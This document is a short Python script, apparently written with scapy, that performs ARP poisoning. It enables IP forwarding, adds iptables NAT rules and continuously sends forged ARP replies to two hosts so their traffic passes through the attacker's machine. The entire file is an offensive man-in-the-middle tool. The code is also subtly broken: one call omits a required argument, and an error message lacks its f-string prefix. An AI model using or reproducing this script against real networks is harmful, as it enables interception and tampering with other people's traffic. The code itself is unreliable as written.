import time
import sys
import os
from scapy.all import *


class ARPPoisoner:

    def enable_ip_forwarding(self, interface: str) -> None:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        os.system(f"iptables -t nat -A POSTROUTING -o {interface} -j MASQUERADE")
        os.system(f"iptables -A FORWARD -i {interface} -j ACCEPT")

    def get_MAC_address(self, ip: str, interface: str) -> str:
        pkt, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                     timeout=2, verbose=False, iface=interface)

        if not pkt:
            raise Exception("MAC address of IP {ip} was not retrieved.")

        return pkt[0][1].hwsrc

    def spoof(self, target_ip: str, spoof_ip: str, target_mac: str, interface: str) -> None:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, verbose=False, iface=interface)

    def run(self, ip1: str, ip2: str, interface: str) -> None:
        self.enable_ip_forwarding(interface)
        mac1 = self.get_MAC_address(ip1, interface)
        mac2 = self.get_MAC_address(ip2, interface)

        try:
            while True:
                self.spoof(ip1, ip2, mac1)
                self.spoof(ip2, ip1, mac2)
                time.sleep(2)
        except KeyboardInterrupt:
            pass
